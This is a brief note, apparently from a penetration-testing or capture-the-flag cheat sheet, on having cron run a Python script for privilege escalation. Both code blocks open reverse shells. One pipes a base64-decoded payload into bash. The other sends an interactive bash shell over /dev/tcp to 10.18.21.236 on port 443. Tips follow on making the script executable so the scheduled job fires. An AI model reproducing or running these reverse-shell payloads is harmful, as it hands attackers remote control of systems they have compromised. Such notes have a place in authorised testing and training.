

```python
#!/usr/bin/env python3

import os
os.system('echo base64EncodedRevshellsScriptHere|base64 -d|bash')
```

```python
#!/usr/bin/env python3

import os

os.system("touch /tmp/testfile")
os.system("echo 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1'|bash")
```

<font color="red">Don't forget to make sure your script file is executable `chmod +x [script]`
cron won't run without both # and +x</font>
Also testrun shell as current user before waiting for scheduled job to run

Instead of hardcoding the path to the Python interpreter, `#!/usr/bin/python3`, use `#!/usr/bin/env python3` as it makes the script more flexible and able to adapt to different environments where the interpreter might be located in a different directory.

